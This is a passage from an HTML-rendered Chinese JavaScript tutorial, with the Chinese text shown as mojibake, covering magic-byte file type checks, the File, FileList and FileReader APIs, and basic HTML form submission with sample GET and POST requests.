type&#x3D;&quot;file&quot; onchange&#x3D;&quot;typefile(this.files[0])&quot;&gt;&lt;&#x2F;input&gt;</span><br><span class="line">function typefile(file) &#123;</span><br><span class="line">  &#x2F;&#x2F; æ–‡ä»¶å¼€å¤´çš„å››ä¸ªå­—èŠ‚ï¼Œç”Ÿæˆä¸€ä¸ª Blob å¯¹è±¡</span><br><span class="line">  var slice &#x3D; file.slice(0, 4);</span><br><span class="line">  var reader &#x3D; new FileReader();</span><br><span class="line">  &#x2F;&#x2F; è¯»å–è¿™å››ä¸ªå­—èŠ‚</span><br><span class="line">  reader.readAsArrayBuffer(slice);</span><br><span class="line">  reader.onload &#x3D; function (e) &#123;</span><br><span class="line">    var buffer &#x3D; reader.result;</span><br><span class="line">    &#x2F;&#x2F; å°†è¿™å››ä¸ªå­—èŠ‚çš„å†…å®¹ï¼Œè§†ä½œä¸€ä¸ª32ä½æ•´æ•°</span><br><span class="line">    var view &#x3D; new DataView(buffer);</span><br><span class="line">    var magic &#x3D; view.getUint32(0, false);</span><br><span class="line">    &#x2F;&#x2F; æ ¹æ®æ–‡ä»¶çš„å‰å››ä¸ªå­—èŠ‚ï¼Œåˆ¤æ–­å®ƒçš„ç±»å‹</span><br><span class="line">    switch(magic) &#123;</span><br><span class="line">      case 0x89504E47: file.verified_type &#x3D; &#39;image&#x2F;png&#39;; break;</span><br><span class="line">      case 0x47494638: file.verified_type &#x3D; &#39;image&#x2F;gif&#39;; break;</span><br><span class="line">      case 0x25504446: file.verified_type &#x3D; &#39;application&#x2F;pdf&#39;; break;</span><br><span class="line">      case 0x504b0304: file.verified_type &#x3D; &#39;application&#x2F;zip&#39;; break;</span><br><span class="line">    &#125;</span><br><span class="line">    console.log(file.name, file.verified_type);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="File-å¯¹è±¡ï¼ŒFileList-å¯¹è±¡ï¼ŒFileReader-å¯¹è±¡"><a href="#File-å¯¹è±¡ï¼ŒFileList-å¯¹è±¡ï¼ŒFileReader-å¯¹è±¡" class="headerlink" title="File å¯¹è±¡ï¼ŒFileList å¯¹è±¡ï¼ŒFileReader å¯¹è±¡"></a>File å¯¹è±¡ï¼ŒFileList å¯¹è±¡ï¼ŒFileReader å¯¹è±¡</h2><h3 id="File-å¯¹è±¡"><a href="#File-å¯¹è±¡" class="headerlink" title="File å¯¹è±¡"></a>File å¯¹è±¡</h3><p>File å¯¹è±¡ä»£è¡¨ä¸€ä¸ªæ–‡ä»¶ï¼Œç”¨æ¥è¯»å†™æ–‡ä»¶ä¿¡æ¯ã€‚å®ƒç»§æ‰¿äº† Blob å¯¹è±¡ï¼Œæˆ–è€…è¯´æ˜¯ä¸€ç§ç‰¹æ®Šçš„ Blob å¯¹è±¡ï¼Œæ‰€æœ‰å¯ä»¥ä½¿ç”¨ Blob å¯¹è±¡çš„åœºåˆéƒ½å¯ä»¥ä½¿ç”¨å®ƒã€‚</p>
<p>æœ€å¸¸è§çš„ä½¿ç”¨åœºåˆæ˜¯è¡¨å•çš„æ–‡ä»¶ä¸Šä¼ æ§ä»¶ï¼ˆ<code>&lt; input type=&quot;file&quot;&gt;</code>ï¼‰ï¼Œç”¨æˆ·é€‰ä¸­æ–‡ä»¶ä»¥åï¼Œæµè§ˆå™¨å°±ä¼šç”Ÿæˆä¸€ä¸ªæ•°ç»„ï¼Œé‡Œé¢æ˜¯æ¯ä¸€ä¸ªç”¨æˆ·é€‰ä¸­çš„æ–‡ä»¶ï¼Œå®ƒä»¬éƒ½æ˜¯ File å®ä¾‹å¯¹è±¡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; HTML ä»£ç å¦‚ä¸‹</span><br><span class="line">&#x2F;&#x2F; &lt;input id&#x3D;&quot;fileItem&quot; type&#x3D;&quot;file&quot;&gt;</span><br><span class="line">var file &#x3D; document.getElementById(&#39;fileItem&#39;).files[0];</span><br><span class="line">file instanceof File &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>file</code>æ˜¯ç”¨æˆ·é€‰ä¸­çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶ï¼Œå®ƒæ˜¯ File çš„å®ä¾‹ã€‚</p>
<h4 id="æ„é€ å‡½æ•°-1"><a href="#æ„é€ å‡½æ•°-1" class="headerlink" title="æ„é€ å‡½æ•°"></a>æ„é€ å‡½æ•°</h4><p>æµè§ˆå™¨åŸç”Ÿæä¾›ä¸€ä¸ª<code>File()</code>æ„é€ å‡½æ•°ï¼Œç”¨æ¥ç”Ÿæˆ File å®ä¾‹å¯¹è±¡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new File(array, name [, options])</span><br></pre></td></tr></table></figure>

<p><code>File()</code>æ„é€ å‡½æ•°æ¥å—ä¸‰ä¸ªå‚æ•°ã€‚</p>
<ul>
<li>arrayï¼šä¸€ä¸ªæ•°ç»„ï¼Œæˆå‘˜å¯ä»¥æ˜¯äºŒè¿›åˆ¶å¯¹è±¡æˆ–å­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæ–‡ä»¶çš„å†…å®¹ã€‚</li>
<li>nameï¼šå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæ–‡ä»¶åæˆ–æ–‡ä»¶è·¯å¾„ã€‚</li>
<li>optionsï¼šé…ç½®å¯¹è±¡ï¼Œè®¾ç½®å®ä¾‹çš„å±æ€§ã€‚è¯¥å‚æ•°å¯é€‰ã€‚</li>
</ul>
<p>ç¬¬ä¸‰ä¸ªå‚æ•°é…ç½®å¯¹è±¡ï¼Œå¯ä»¥è®¾ç½®ä¸¤ä¸ªå±æ€§ã€‚</p>
<ul>
<li>typeï¼šå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºå®ä¾‹å¯¹è±¡çš„ MIME ç±»å‹ï¼Œé»˜è®¤å€¼ä¸ºç©ºå­—ç¬¦ä¸²ã€‚</li>
<li>lastModifiedï¼šæ—¶é—´æˆ³ï¼Œè¡¨ç¤ºä¸Šæ¬¡ä¿®æ”¹çš„æ—¶é—´ï¼Œé»˜è®¤ä¸º<code>Date.now()</code>ã€‚</li>
</ul>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var file &#x3D; new File(</span><br><span class="line">  [&#39;foo&#39;],</span><br><span class="line">  &#39;foo.txt&#39;,</span><br><span class="line">  &#123;</span><br><span class="line">    type: &#39;text&#x2F;plain&#39;,</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h4 id="å®ä¾‹å±æ€§å’Œå®ä¾‹æ–¹æ³•-1"><a href="#å®ä¾‹å±æ€§å’Œå®ä¾‹æ–¹æ³•-1" class="headerlink" title="å®ä¾‹å±æ€§å’Œå®ä¾‹æ–¹æ³•"></a>å®ä¾‹å±æ€§å’Œå®ä¾‹æ–¹æ³•</h4><p>File å¯¹è±¡æœ‰ä»¥ä¸‹å®ä¾‹å±æ€§ã€‚</p>
<ul>
<li>File.lastModifiedï¼šæœ€åä¿®æ”¹æ—¶é—´</li>
<li>File.nameï¼šæ–‡ä»¶åæˆ–æ–‡ä»¶è·¯å¾„</li>
<li>File.sizeï¼šæ–‡ä»¶å¤§å°ï¼ˆå•ä½å­—èŠ‚ï¼‰</li>
<li>File.typeï¼šæ–‡ä»¶çš„ MIME ç±»å‹</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var myFile &#x3D; new File([], &#39;file.bin&#39;, &#123;</span><br><span class="line">  lastModified: new Date(2018, 1, 1),</span><br><span class="line">&#125;);</span><br><span class="line">myFile.lastModified &#x2F;&#x2F; 1517414400000</span><br><span class="line">myFile.name &#x2F;&#x2F; &quot;file.bin&quot;</span><br><span class="line">myFile.size &#x2F;&#x2F; 0</span><br><span class="line">myFile.type &#x2F;&#x2F; &quot;&quot;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œç”±äº<code>myFile</code>çš„å†…å®¹ä¸ºç©ºï¼Œä¹Ÿæ²¡æœ‰è®¾ç½® MIME ç±»å‹ï¼Œæ‰€ä»¥<code>size</code>å±æ€§ç­‰äº0ï¼Œ<code>type</code>å±æ€§ç­‰äºç©ºå­—ç¬¦ä¸²ã€‚</p>
<p>File å¯¹è±¡æ²¡æœ‰è‡ªå·±çš„å®ä¾‹æ–¹æ³•ï¼Œç”±äºç»§æ‰¿äº† Blob å¯¹è±¡ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨ Blob çš„å®ä¾‹æ–¹æ³•<code>slice()</code>ã€‚</p>
<h3 id="FileList-å¯¹è±¡"><a href="#FileList-å¯¹è±¡" class="headerlink" title="FileList å¯¹è±¡"></a>FileList å¯¹è±¡</h3><p><code>FileList</code>å¯¹è±¡æ˜¯ä¸€ä¸ªç±»ä¼¼æ•°ç»„çš„å¯¹è±¡ï¼Œä»£è¡¨ä¸€ç»„é€‰ä¸­çš„æ–‡ä»¶ï¼Œæ¯ä¸ªæˆå‘˜éƒ½æ˜¯ä¸€ä¸ª File å®ä¾‹ã€‚å®ƒä¸»è¦å‡ºç°åœ¨ä¸¤ä¸ªåœºåˆã€‚</p>
<ul>
<li>æ–‡ä»¶æ§ä»¶èŠ‚ç‚¹ï¼ˆ<code>&lt;input type=&quot;file&quot;&gt;</code>ï¼‰çš„<code>files</code>å±æ€§ï¼Œè¿”å›ä¸€ä¸ª FileList å®ä¾‹ã€‚</li>
<li>æ‹–æ‹‰ä¸€ç»„æ–‡ä»¶æ—¶ï¼Œç›®æ ‡åŒºçš„<code>DataTransfer.files</code>å±æ€§ï¼Œè¿”å›ä¸€ä¸ª FileList å®ä¾‹ã€‚</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; HTML ä»£ç å¦‚ä¸‹</span><br><span class="line">&#x2F;&#x2F; &lt;input id&#x3D;&quot;fileItem&quot; type&#x3D;&quot;file&quot;&gt;</span><br><span class="line">var files &#x3D; document.getElementById(&#39;fileItem&#39;).files;</span><br><span class="line">files instanceof FileList &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œæ–‡ä»¶æ§ä»¶çš„<code>files</code>å±æ€§æ˜¯ä¸€ä¸ª FileList å®ä¾‹ã€‚</p>
<p>FileList çš„å®ä¾‹å±æ€§ä¸»è¦æ˜¯<code>length</code>ï¼Œè¡¨ç¤ºåŒ…å«å¤šå°‘ä¸ªæ–‡ä»¶ã€‚</p>
<p>FileList çš„å®ä¾‹æ–¹æ³•ä¸»è¦æ˜¯<code>item()</code>ï¼Œç”¨æ¥è¿”å›æŒ‡å®šä½ç½®çš„å®ä¾‹ã€‚å®ƒæ¥å—ä¸€ä¸ªæ•´æ•°ä½œä¸ºå‚æ•°ï¼Œè¡¨ç¤ºä½ç½®çš„åºå·ï¼ˆä»é›¶å¼€å§‹ï¼‰ã€‚ä½†æ˜¯ï¼Œç”±äº FileList çš„å®ä¾‹æ˜¯ä¸€ä¸ªç±»ä¼¼æ•°ç»„çš„å¯¹è±¡ï¼Œå¯ä»¥ç›´æ¥ç”¨æ–¹æ‹¬å·è¿ç®—ç¬¦ï¼Œå³<code>myFileList[0]</code>ç­‰åŒäº<code>myFileList.item(0)</code>ï¼Œæ‰€ä»¥ä¸€èˆ¬ç”¨ä¸åˆ°<code>item()</code>æ–¹æ³•ã€‚</p>
<h3 id="FileReader-å¯¹è±¡"><a href="#FileReader-å¯¹è±¡" class="headerlink" title="FileReader å¯¹è±¡"></a>FileReader å¯¹è±¡</h3><p>FileReader å¯¹è±¡ç”¨äºè¯»å– File å¯¹è±¡æˆ– Blob å¯¹è±¡æ‰€åŒ…å«çš„æ–‡ä»¶å†…å®¹ã€‚</p>
<p>æµè§ˆå™¨åŸç”Ÿæä¾›ä¸€ä¸ª<code>FileReader</code>æ„é€ å‡½æ•°ï¼Œç”¨æ¥ç”Ÿæˆ FileReader å®ä¾‹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var reader &#x3D; new FileReader();</span><br></pre></td></tr></table></figure>

<p>FileReader æœ‰ä»¥ä¸‹çš„å®ä¾‹å±æ€§ã€‚</p>
<ul>
<li>FileReader.errorï¼šè¯»å–æ–‡ä»¶æ—¶äº§ç”Ÿçš„é”™è¯¯å¯¹è±¡</li>
<li>FileReader.readyStateï¼šæ•´æ•°ï¼Œè¡¨ç¤ºè¯»å–æ–‡ä»¶æ—¶çš„å½“å‰çŠ¶æ€ã€‚ä¸€å…±æœ‰ä¸‰ç§å¯èƒ½çš„çŠ¶æ€ï¼Œ<code>0</code>è¡¨ç¤ºå°šæœªåŠ è½½ä»»ä½•æ•°æ®ï¼Œ<code>1</code>è¡¨ç¤ºæ•°æ®æ­£åœ¨åŠ è½½ï¼Œ<code>2</code>è¡¨ç¤ºåŠ è½½å®Œæˆã€‚</li>
<li>FileReader.resultï¼šè¯»å–å®Œæˆåçš„æ–‡ä»¶å†…å®¹ï¼Œæœ‰å¯èƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯èƒ½æ˜¯ä¸€ä¸ª ArrayBuffer å®ä¾‹ã€‚</li>
<li>FileReader.onabortï¼š<code>abort</code>äº‹ä»¶ï¼ˆç”¨æˆ·ç»ˆæ­¢è¯»å–æ“ä½œï¼‰çš„ç›‘å¬å‡½æ•°ã€‚</li>
<li>FileReader.onerrorï¼š<code>error</code>äº‹ä»¶ï¼ˆè¯»å–é”™è¯¯ï¼‰çš„ç›‘å¬å‡½æ•°ã€‚</li>
<li>FileReader.onloadï¼š<code>load</code>äº‹ä»¶ï¼ˆè¯»å–æ“ä½œå®Œæˆï¼‰çš„ç›‘å¬å‡½æ•°ï¼Œé€šå¸¸åœ¨è¿™ä¸ªå‡½æ•°é‡Œé¢ä½¿ç”¨<code>result</code>å±æ€§ï¼Œæ‹¿åˆ°æ–‡ä»¶å†…å®¹ã€‚</li>
<li>FileReader.onloadstartï¼š<code>loadstart</code>äº‹ä»¶ï¼ˆè¯»å–æ“ä½œå¼€å§‹ï¼‰çš„ç›‘å¬å‡½æ•°ã€‚</li>
<li>FileReader.onloadendï¼š<code>loadend</code>äº‹ä»¶ï¼ˆè¯»å–æ“ä½œç»“æŸï¼‰çš„ç›‘å¬å‡½æ•°ã€‚</li>
<li>FileReader.onprogressï¼š<code>progress</code>äº‹ä»¶ï¼ˆè¯»å–æ“ä½œè¿›è¡Œä¸­ï¼‰çš„ç›‘å¬å‡½æ•°ã€‚</li>
</ul>
<p>ä¸‹é¢æ˜¯ç›‘å¬<code>load</code>äº‹ä»¶çš„ä¸€ä¸ªä¾‹å­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; HTML ä»£ç å¦‚ä¸‹</span><br><span class="line">&#x2F;&#x2F; &lt;input type&#x3D;&quot;file&quot; onchange&#x3D;&quot;onChange(event)&quot;&gt;</span><br><span class="line"></span><br><span class="line">function onChange(event) &#123;</span><br><span class="line">  var file &#x3D; event.target.files[0];</span><br><span class="line">  var reader &#x3D; new FileReader();</span><br><span class="line">  reader.onload &#x3D; function (event) &#123;</span><br><span class="line">    console.log(event.target.result)</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  reader.readAsText(file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œæ¯å½“æ–‡ä»¶æ§ä»¶å‘ç”Ÿå˜åŒ–ï¼Œå°±å°è¯•è¯»å–ç¬¬ä¸€ä¸ªæ–‡ä»¶ã€‚å¦‚æœè¯»å–æˆåŠŸï¼ˆ<code>load</code>äº‹ä»¶å‘ç”Ÿï¼‰ï¼Œå°±æ‰“å°å‡ºæ–‡ä»¶å†…å®¹ã€‚</p>
<p>FileReader æœ‰ä»¥ä¸‹å®ä¾‹æ–¹æ³•ã€‚</p>
<ul>
<li>FileReader.abort()ï¼šç»ˆæ­¢è¯»å–æ“ä½œï¼Œ<code>readyState</code>å±æ€§å°†å˜æˆ<code>2</code>ã€‚</li>
<li>FileReader.readAsArrayBuffer()ï¼šä»¥ ArrayBuffer çš„æ ¼å¼è¯»å–æ–‡ä»¶ï¼Œè¯»å–å®Œæˆå<code>result</code>å±æ€§å°†è¿”å›ä¸€ä¸ª ArrayBuffer å®ä¾‹ã€‚</li>
<li>FileReader.readAsBinaryString()ï¼šè¯»å–å®Œæˆåï¼Œ<code>result</code>å±æ€§å°†è¿”å›åŸå§‹çš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²ã€‚</li>
<li>FileReader.readAsDataURL()ï¼šè¯»å–å®Œæˆåï¼Œ<code>result</code>å±æ€§å°†è¿”å›ä¸€ä¸ª Data URL æ ¼å¼ï¼ˆBase64 ç¼–ç ï¼‰çš„å­—ç¬¦ä¸²ï¼Œä»£è¡¨æ–‡ä»¶å†…å®¹ã€‚å¯¹äºå›¾ç‰‡æ–‡ä»¶ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²å¯ä»¥ç”¨äº<code>&lt; img&gt;</code>å…ƒç´ çš„<code>src</code>å±æ€§ã€‚æ³¨æ„ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²ä¸èƒ½ç›´æ¥è¿›è¡Œ Base64 è§£ç ï¼Œå¿…é¡»æŠŠå‰ç¼€<code>data:*/*;base64,</code>ä»å­—ç¬¦ä¸²é‡Œåˆ é™¤ä»¥åï¼Œå†è¿›è¡Œè§£ç ã€‚</li>
<li>FileReader.readAsText()ï¼šè¯»å–å®Œæˆåï¼Œ<code>result</code>å±æ€§å°†è¿”å›æ–‡ä»¶å†…å®¹çš„æ–‡æœ¬å­—ç¬¦ä¸²ã€‚è¯¥æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä»£è¡¨æ–‡ä»¶çš„ Blob å®ä¾‹ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å¯é€‰çš„ï¼Œè¡¨ç¤ºæ–‡æœ¬ç¼–ç ï¼Œé»˜è®¤ä¸º UTF-8ã€‚</li>
</ul>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* HTML ä»£ç å¦‚ä¸‹</span><br><span class="line">  &lt;input type&#x3D;&quot;file&quot; onchange&#x3D;&quot;previewFile()&quot;&gt;</span><br><span class="line">  &lt;img src&#x3D;&quot;&quot; height&#x3D;&quot;200&quot;&gt;</span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line">function previewFile() &#123;</span><br><span class="line">  var preview &#x3D; document.querySelector(&#39;img&#39;);</span><br><span class="line">  var file    &#x3D; document.querySelector(&#39;input[type&#x3D;file]&#39;).files[0];</span><br><span class="line">  var reader  &#x3D; new FileReader();</span><br><span class="line"></span><br><span class="line">  reader.addEventListener(&#39;load&#39;, function () &#123;</span><br><span class="line">    preview.src &#x3D; reader.result;</span><br><span class="line">  &#125;, false);</span><br><span class="line"></span><br><span class="line">  if (file) &#123;</span><br><span class="line">    reader.readAsDataURL(file);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œç”¨æˆ·é€‰ä¸­å›¾ç‰‡æ–‡ä»¶ä»¥åï¼Œè„šæœ¬ä¼šè‡ªåŠ¨è¯»å–æ–‡ä»¶å†…å®¹ï¼Œç„¶åä½œä¸ºä¸€ä¸ª Data URL èµ‹å€¼ç»™<code>&lt; img&gt;</code>å…ƒç´ çš„<code>src</code>å±æ€§ï¼Œä»è€ŒæŠŠå›¾ç‰‡å±•ç¤ºå‡ºæ¥ã€‚</p>
<h2 id="è¡¨å•ï¼ŒFormData-å¯¹è±¡"><a href="#è¡¨å•ï¼ŒFormData-å¯¹è±¡" class="headerlink" title="è¡¨å•ï¼ŒFormData å¯¹è±¡"></a>è¡¨å•ï¼ŒFormData å¯¹è±¡</h2><h3 id="è¡¨å•æ¦‚è¿°"><a href="#è¡¨å•æ¦‚è¿°" class="headerlink" title="è¡¨å•æ¦‚è¿°"></a>è¡¨å•æ¦‚è¿°</h3><p>è¡¨å•ï¼ˆ<code>&lt;form&gt;</code>ï¼‰ç”¨æ¥æ”¶é›†ç”¨æˆ·æäº¤çš„æ•°æ®ï¼Œå‘é€åˆ°æœåŠ¡å™¨ã€‚æ¯”å¦‚ï¼Œç”¨æˆ·æäº¤ç”¨æˆ·åå’Œå¯†ç ï¼Œè®©æœåŠ¡å™¨éªŒè¯ï¼Œå°±è¦é€šè¿‡è¡¨å•ã€‚è¡¨å•æä¾›å¤šç§æ§ä»¶ï¼Œè®©å¼€å‘è€…ä½¿ç”¨ï¼Œå…·ä½“çš„æ§ä»¶ç§ç±»å’Œç”¨æ³•è¯·å‚è€ƒ HTML è¯­è¨€çš„æ•™ç¨‹ã€‚æœ¬ç« ä¸»è¦ä»‹ç» JavaScript ä¸è¡¨å•çš„äº¤äº’ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;&#x2F;handling-page&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;label for&#x3D;&quot;name&quot;&gt;ç”¨æˆ·åï¼š&lt;&#x2F;label&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;name&quot; name&#x3D;&quot;user_name&quot; &#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;label for&#x3D;&quot;passwd&quot;&gt;å¯†ç ï¼š&lt;&#x2F;label&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;password&quot; id&#x3D;&quot;passwd&quot; name&#x3D;&quot;user_passwd&quot; &#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; id&#x3D;&quot;submit&quot; name&#x3D;&quot;submit_button&quot; value&#x3D;&quot;æäº¤&quot; &#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç å°±æ˜¯ä¸€ä¸ªç®€å•çš„è¡¨å•ï¼ŒåŒ…å«ä¸‰ä¸ªæ§ä»¶ï¼šç”¨æˆ·åè¾“å…¥æ¡†ã€å¯†ç è¾“å…¥æ¡†å’Œæäº¤æŒ‰é’®ã€‚</p>
<p>ç”¨æˆ·ç‚¹å‡»â€œæäº¤â€æŒ‰é’®ï¼Œæ¯ä¸€ä¸ªæ§ä»¶éƒ½ä¼šç”Ÿæˆä¸€ä¸ªé”®å€¼å¯¹ï¼Œé”®åæ˜¯æ§ä»¶çš„<code>name</code>å±æ€§ï¼Œé”®å€¼æ˜¯æ§ä»¶çš„<code>value</code>å±æ€§ï¼Œé”®åå’Œé”®å€¼ä¹‹é—´ç”±ç­‰å·è¿æ¥ã€‚æ¯”å¦‚ï¼Œç”¨æˆ·åè¾“å…¥æ¡†çš„<code>name</code>å±æ€§æ˜¯<code>user_name</code>ï¼Œ<code>value</code>å±æ€§æ˜¯ç”¨æˆ·è¾“å…¥çš„å€¼ï¼Œå‡å®šæ˜¯â€œå¼ ä¸‰â€ï¼Œæäº¤åˆ°æœåŠ¡å™¨çš„æ—¶å€™ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªé”®å€¼å¯¹<code>user_name=å¼ ä¸‰</code>ã€‚</p>
<p>æ‰€æœ‰çš„é”®å€¼å¯¹éƒ½ä¼šæäº¤åˆ°æœåŠ¡å™¨ã€‚ä½†æ˜¯ï¼Œæäº¤çš„æ•°æ®æ ¼å¼è·Ÿ<code>&lt;form&gt;</code>å…ƒç´ çš„<code>method</code>å±æ€§æœ‰å…³ã€‚è¯¥å±æ€§æŒ‡å®šäº†æäº¤æ•°æ®çš„ HTTP æ–¹æ³•ã€‚å¦‚æœæ˜¯ GET æ–¹æ³•ï¼Œæ‰€æœ‰é”®å€¼å¯¹ä¼šä»¥ URL çš„æŸ¥è¯¢å­—ç¬¦ä¸²å½¢å¼ï¼Œæäº¤åˆ°æœåŠ¡å™¨ï¼Œæ¯”å¦‚<code>/handling-page?user_name=å¼ ä¸‰&amp;user_passwd=123&amp;submit_button=æäº¤</code>ã€‚ä¸‹é¢å°±æ˜¯ GET è¯·æ±‚çš„ HTTP å¤´ä¿¡æ¯ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;handling-page?user_name&#x3D;å¼ ä¸‰&amp;user_passwd&#x3D;123&amp;submit_button&#x3D;æäº¤</span><br><span class="line">Host: example.com</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ˜¯ POST æ–¹æ³•ï¼Œæ‰€æœ‰é”®å€¼å¯¹ä¼šè¿æ¥æˆä¸€è¡Œï¼Œä½œä¸º HTTP è¯·æ±‚çš„æ•°æ®ä½“å‘é€åˆ°æœåŠ¡å™¨ï¼Œæ¯”å¦‚<code>user_name=å¼ ä¸‰&amp;user_passwd=123&amp;submit_button=æäº¤</code>ã€‚ä¸‹é¢å°±æ˜¯ POST è¯·æ±‚çš„å¤´ä¿¡æ¯ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;handling-page HTTP&#x2F;1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 74</span><br><span class="line"></span><br><span class="line">user_name&#x3D;å¼ ä¸‰&amp;user_passwd&#x3D;123&amp;submit_button&#x3D;æäº¤</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼Œå®é™…æäº¤çš„æ—¶å€™ï¼Œåªè¦é”®å€¼ä¸æ˜¯ URL çš„åˆæ³•å­—ç¬¦ï¼ˆæ¯”å¦‚æ±‰å­—â€œå¼ ä¸‰â€å’Œâ€œæäº¤â€ï¼‰ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å¯¹å…¶è¿›è¡Œç¼–ç ã€‚</p>
<p>ç‚¹å‡»<code>submit</code>æ§ä»¶ï¼Œå°±å¯ä»¥æäº¤è¡¨å•ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form&gt;</span><br><span class="line">  &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;æäº¤&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢è¡¨å•å°±åŒ…å«ä¸€ä¸ª<code>submit</code>æ§ä»¶ï¼Œç‚¹å‡»è¿™ä¸ªæ§ä»¶ï¼Œæµè§ˆå™¨å°±ä¼šæŠŠè¡¨å•æ•°æ®å‘æœåŠ¡å™¨æäº¤ã€‚</p>
<p>æ³¨æ„ï¼Œè¡¨å•é‡Œé¢çš„<code>&lt;button&gt;</code>å…ƒç´ å¦‚æœæ²¡æœ‰ç”¨<code>type</code>å±æ€§æŒ‡å®šç±»å‹ï¼Œé‚£ä¹ˆé»˜è®¤å°±æ˜¯<code>submit</code>æ§ä»¶ã€‚</p>
